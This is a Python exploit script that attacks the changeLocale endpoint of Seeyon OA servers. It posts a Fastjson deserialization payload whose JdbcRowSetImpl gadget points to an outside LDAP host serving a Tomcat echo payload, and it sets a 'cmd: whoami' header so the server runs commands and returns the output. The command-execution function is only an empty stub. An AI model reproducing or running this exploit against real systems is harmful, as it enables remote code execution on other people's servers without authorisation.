import time
import argparse
import multiprocessing
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def exp_check(target_url):
    url = target_url+'/seeyon/main.do?method=changeLocale'
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "cmd": "whoami",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data= "_json_params={\"v47\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"xxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://xx.xxx.xxx.xxx:1289/TomcatBypass/TomcatEcho\",\"autoCommit\":true}}"
    try:
        response=requests.post(url,headers=headers,data=data, verify=False)
        if response.status_code == 200:
            return 1
        else:
            return 2
    except:
        return 3

def exp_cmd(url,cmd):
        pass